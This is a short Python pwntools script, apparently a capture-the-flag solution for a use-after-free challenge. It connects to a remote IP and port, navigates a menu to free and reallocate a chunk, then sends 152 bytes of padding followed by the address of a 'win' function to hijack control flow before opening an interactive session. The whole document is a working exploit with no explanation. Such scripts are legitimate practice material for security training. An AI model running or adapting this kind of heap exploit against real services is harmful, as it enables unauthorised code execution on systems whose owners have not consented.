from pwn import *

ip = "140.110.112.77"
port = 4006

context.arch = "amd64"

r = remote(ip, port)
# r = process("./uaf")

win = 0x401239

r.sendlineafter(">", "4")

r.sendlineafter(">", "1")
r.sendlineafter(":", "160")

payload = b"a" * 8 * 19
payload += flat(win)

r.sendlineafter(":", payload)

r.sendlineafter(">", "4")

r.interactive()
